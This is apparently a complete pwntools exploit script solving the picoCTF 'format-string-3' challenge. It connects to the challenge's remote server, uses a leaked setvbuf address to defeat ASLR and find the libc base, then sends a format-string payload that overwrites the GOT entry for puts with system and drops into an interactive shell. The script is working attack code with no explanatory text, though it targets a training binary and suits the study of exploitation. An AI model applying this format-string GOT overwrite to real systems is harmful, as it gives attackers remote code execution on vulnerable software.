#!/usr/bin/env python3

from pwn import *

context(arch="amd64", os="linux")

elf = ELF("./format-string-3")
libc = elf.libc

r = remote("rhea.picoctf.net", "54372")
#r = process("./format-string-3")
r.recvuntil("x")
static_setvbuf = libc.sym.setvbuf
aslr_setvbuf = int(r.recv(12), 16)
libc.address = aslr_setvbuf - static_setvbuf

r.sendline(fmtstr_payload(38, {elf.got["puts"]: libc.sym.system}))
r.interactive()
